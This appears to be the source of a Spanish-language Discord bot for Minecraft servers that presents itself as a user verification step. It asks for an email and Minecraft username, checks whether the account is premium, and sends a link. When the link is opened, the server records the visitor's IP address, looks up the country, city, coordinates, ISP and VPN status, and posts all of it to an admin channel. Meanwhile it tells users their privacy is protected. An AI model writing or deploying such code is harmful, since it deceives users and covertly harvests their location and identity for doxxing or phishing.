const { Client, GatewayIntentBits, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require("discord.js");
const axios = require("axios");
const express = require("express");
const { v4: uuidv4 } = require("uuid");
const path = require("path");

const client = new Client({
 intents: [
  GatewayIntentBits.Guilds,
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent
 ]
});

// ------------------- CONFIG -------------------
const TOKEN = "BOTDISCORD";
const ADMIN_CHANNEL = "1482434341542957086";
const VERIFIED_ROLE_ID = "1483308967269503108";

// <-- Usamos tu página HTML local -->
const PUBLIC_URL = "LINK PO POLLO XD"; 

const pending = {};

// ------------------- FUNCIONES -------------------
async function checkMinecraft(username){
 try {
  const res = await axios.get(`https://api.mojang.com/users/profiles/minecraft/${username}`);
  if(res.data && res.data.id) return "Premium";
 } catch {}
 return "No Premium";
}

async function getIPData(ip){
 try {
  const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,hosting,proxy`);
  if(res.data && res.data.status === "success"){
   return {
    country: res.data.country || "Desconocido",
    city: res.data.city || "Desconocido",
    lat: res.data.lat,
    lon: res.data.lon,
    isp: res.data.isp || "Desconocido",
    hosting: res.data.hosting,
    proxy: res.data.proxy
   };
  }
 } catch {}
 return { country:"Desconocido", city:"Desconocido", lat:null, lon:null, isp:"Desconocido", hosting:false, proxy:false };
}

// ------------------- BOT READY -------------------
client.once("ready", () => {
 console.log(`Bot listo como ${client.user.tag}`);
});

// ------------------- COMANDO !VERIFICACION -------------------
client.on("messageCreate", async message => {
 if(message.content === "!verificacion"){
  const embed = new EmbedBuilder()
   .setTitle("🔒 Verificación de Usuario")
   .setDescription("¡Hola! Para acceder al servidor, necesitas verificar tu cuenta.\n\nPresiona el botón de abajo para comenzar.")
   .setColor("#00BFFF")
   .setThumbnail("https://i.imgur.com/4M34hi2.png")
   .setFooter({ text: "Tu privacidad está protegida 🔐", iconURL: "https://i.imgur.com/9qv2hGb.png" })
   .setTimestamp();

  const boton = new ButtonBuilder()
   .setCustomId("verificar")
   .setLabel("Comenzar Verificación")
   .setStyle(ButtonStyle.Success)
   .setEmoji("✅");

  const row = new ActionRowBuilder().addComponents(boton);

  message.channel.send({ embeds:[embed], components:[row] });
 }
});

// ------------------- INTERACCIONES -------------------
client.on("interactionCreate", async interaction => {
 if(interaction.isButton() && interaction.customId === "verificar"){
  const modal = new ModalBuilder()
   .setCustomId("verificacion_modal")
   .setTitle("Formulario de Verificación");

  const email = new TextInputBuilder()
   .setCustomId("email")
   .setLabel("Correo electrónico")
   .setStyle(TextInputStyle.Short)
   .setRequired(true);

  const mc = new TextInputBuilder()
   .setCustomId("minecraft")
   .setLabel("Minecraft Username")
   .setStyle(TextInputStyle.Short)
   .setRequired(true);

  modal.addComponents(
   new ActionRowBuilder().addComponents(email),
   new ActionRowBuilder().addComponents(mc)
  );

  await interaction.showModal(modal);
 }

 if(interaction.isModalSubmit() && interaction.customId === "verificacion_modal"){
  const email = interaction.fields.getTextInputValue("email");
  const mc = interaction.fields.getTextInputValue("minecraft");
  const type = await checkMinecraft(mc);
  const id = uuidv4();

  pending[id] = { email, mc, type, user: interaction.user };

  // Link apunta a tu HTML en public
  const link = `${PUBLIC_URL}/?id=${id}`;

  await interaction.reply({ content:`📩 Abre este link para completar la verificación:\n${link}`, ephemeral:true });
 }
});

// ------------------- SERVIDOR WEB -------------------
const app = express();
app.use(express.static(path.join(__dirname, "public")));

// Endpoint de verificación
app.get("/verificar/:id", async (req,res) => {
 const data = pending[req.params.id];
 if(!data) return res.status(404).send("<h2>Link inválido o expirado</h2>");

 const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || req.ip).split(",")[0].trim();
 const ipData = await getIPData(ip);

 const guild = client.guilds.cache.first();
 const canal = guild.channels.cache.get(ADMIN_CHANNEL);

 const embedAdmin = new EmbedBuilder()
  .setTitle("🚨 Nueva verificación")
  .setColor("Red")
  .addFields(
   { name:"📧 Correo Electrónico", value:data.email, inline:false },
   { name:"🎮 Minecraft Username", value:data.mc, inline:true },
   { name:"⛏ Tipo de Minecraft", value:data.type, inline:true },
   { name:"👤 Usuario Discord", value:data.user.tag, inline:true },
   { name:"🆔 Discord ID", value:data.user.id, inline:false },
   { name:"🌍 IP", value:ip || "No detectada", inline:false },
   { name:"📍 País", value:ipData.country, inline:true },
   { name:"🏙 Ciudad", value:ipData.city, inline:true },
   { name:"📡 ISP", value:ipData.isp, inline:false },
   { name:"🛡 VPN / Hosting", value:(ipData.proxy||ipData.hosting)?"Sí":"No", inline:false }
  )
  .setTimestamp();

 canal.send({embeds:[embedAdmin]});

 // Asignar rol de verificado
 const member = await guild.members.fetch(data.user.id).catch(() => null);
 if(member) await member.roles.add(VERIFIED_ROLE_ID).catch(err=>console.log(err));

 delete pending[req.params.id];

 res.send("<h2>✅ Verificación completada. Puedes cerrar esta página.</h2>");
});

// ------------------- INICIAR BOT Y SERVIDOR -------------------
client.login(TOKEN);
app.listen(3000, ()=>console.log("Servidor web activo en puerto 3000"));